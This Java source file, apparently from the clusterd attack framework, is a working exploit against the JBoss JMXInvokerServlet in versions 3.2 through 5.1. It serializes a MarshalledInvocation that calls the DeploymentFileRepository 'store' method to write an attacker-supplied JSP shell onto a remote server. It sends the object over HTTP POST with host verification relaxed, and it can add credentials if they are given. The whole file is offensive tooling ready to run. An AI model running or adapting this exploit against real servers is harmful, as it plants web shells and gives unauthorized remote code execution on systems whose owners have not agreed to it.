import java.net.URL;
import java.util.Map;
import java.util.HashMap;
import java.util.Scanner;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;

// jboss
import org.jboss.invocation.InvocationException;
import org.jboss.invocation.MarshalledInvocation;
import org.jboss.invocation.MarshalledValue;
import org.jboss.mx.util.ObjectNameFactory;
import javax.management.ObjectName;
import org.jboss.security.SimplePrincipal;

/*
 This application is part of the clusterd attack framework.

 invkdeploy is a modified copy of the invoker code taken from:

    http://breenmachine.blogspot.com/2013/09/jboss-jmxinvokerservlet-exploit.html

 This file takes four arguments: [version] [remote url] [jsp] [random value] 

 All versions use the DFS deployer for reliability reasons.
 */
public class invkdeploy{
    private static Map<String, Integer> populateHashes(){
        Map<String, Integer> versions = new HashMap<String, Integer>();
        versions.put("3.2", 647347722); // tested against 3.2.7.GA
        versions.put("4.0", 647347722); // tested against 4.0.5.GA
        versions.put("4.2", 647347722); // tested against 4.2.3.GA
        versions.put("5.0", -483630874); // tested against 5.0.0
        versions.put("5.1", -483630874); // tested against 5.1.0
        return versions;
    }

    private static String readJsp(String path) throws Exception {
        return new Scanner(new File(path)).useDelimiter("\\A").next();
    }

    public static void main (String args[]) throws Exception {

        Map<String, Integer> version_hash = populateHashes();

        String version;
        Integer hash;
        Integer random_value;
        String remote_url;
        String local_url;
        String username = null;
        String password = null;
        boolean doAuth = false;

        // 5.x settings
        String jsp_shell = null;    // jsp shell
        String jsp_path = null;     // jsp abs path
        String jsp = null;          // jsp full name
        String jsps = null;         // jsp stripped of extension

        Object[] file_list;
        String save_location = "payload.out";

        // parse cli
        try {
            version = (String)args[0]; 
            remote_url = args[1];
            local_url = args[2];
            random_value = Integer.parseInt(args[3]);

            if(args.length > 4){
                username = (String)args[4];
                password = (String)args[5];
                doAuth = true;
            }

            hash = version_hash.get(version);
            if(hash == null){
                System.out.println("Version unsupported");
                return;
            }

            jsp_path = local_url;
            jsp_shell = readJsp(jsp_path);
            if(jsp_shell == null){
                return;
            }

            jsp = jsp_path.substring(jsp_path.lastIndexOf("/") + 1);
            jsps = jsp.split("\\.")[0];
            
        }
        catch(Exception e){
            System.out.println(e);
            return;
        }

        MarshalledInvocation payload = new MarshalledInvocation();
        payload.setObjectName(version_hash.get(version));  

        Class<?> c = Class.forName("javax.management.MBeanServerConnection");
        Method method = c.getDeclaredMethod("invoke", javax.management.ObjectName.class,
                                                      java.lang.String.class,
                                                      java.lang.Object[].class,
                                                      java.lang.String[].class);
        payload.setMethod(method);

        file_list = new Object[]{
                new javax.management.ObjectName("jboss.admin:service=DeploymentFileRepository"),
                "store",
                new Object[]{String.format("%s%d.war", jsps, random_value), 
                                            jsps, ".jsp", jsp_shell, true},
                new String[]{"java.lang.String", "java.lang.String", "java.lang.String",
                             "java.lang.String", "boolean"}
        };
        
        payload.setArguments(file_list);
        if(doAuth){
            payload.setCredential(new MarshalledValue(username));
            payload.setPrincipal(new SimplePrincipal(password));
        }

        FileOutputStream fileOut = new FileOutputStream(save_location); 
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(payload);
        out.close();
        fileOut.close();

        String type = "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue";
        URL url = new URL(remote_url);
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        TrustModifier.relaxHostChecking(connection);

        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", type);
        connection.setRequestProperty("Content-Length", "10000");
        
        OutputStream os = connection.getOutputStream();
        new ObjectOutputStream(os).writeObject(payload);

        ObjectInputStream in = new ObjectInputStream(connection.getInputStream());
        Object obj = in.readObject();
        if(obj.getClass().toString().equals("class org.jboss.invocation.MarshalledValue")){
            MarshalledValue mv = (MarshalledValue)obj;
            Object mvContent = mv.get();
            if(mvContent != null && mvContent.getClass().toString().equals(
                                    "class org.jboss.invocation.InvocationException")){
                            System.err.println("Invocation Exception");
                            InvocationException ie = (InvocationException)mvContent;
                            System.out.println(ie.getMessage());
                            ie.printStackTrace();
            }
        }
    }
}
